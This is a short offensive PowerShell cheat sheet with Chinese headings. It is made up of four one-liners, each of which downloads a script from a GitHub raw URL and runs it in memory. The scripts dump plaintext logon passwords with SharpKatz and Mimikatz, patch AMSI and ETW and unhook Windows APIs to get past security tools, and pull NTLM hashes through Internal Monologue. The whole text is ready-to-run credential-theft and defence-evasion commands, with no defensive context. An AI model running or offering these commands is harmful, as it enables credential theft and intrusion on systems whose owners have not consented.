
#[+] 1.获取明文登入密码
iex(iwr -UseBasicParsing https://raw.githubusercontent.com/INotGreen/Invoke-SharpOffensive/main/Invoke-SharpKatz.ps1);Invoke-SharpKatz 

#[+] 2.Patch-AMSI && Pacth-ETW && Unhook win32 API
iex(iwr -UseBasicParsing https://raw.githubusercontent.com/INotGreen/Invoke-SharpOffensive/main/Invoke-SharpUnhook.ps1);

#[+] 3.Mimikatz获取登入明文密码
iex(iwr -UseBasicParsing https://raw.githubusercontent.com/INotGreen/Invoke-SharpOffensive/main/Invoke-Mimikatz.ps1);Invoke-Mimikatz

#[+] 4.在不接触 LSASS 的情况下检索 NTLM 哈希
iex(iwr -UseBasicParsing https://raw.githubusercontent.com/INotGreen/Invoke-SharpOffensive/main/Invoke-Internalmonologue.ps1)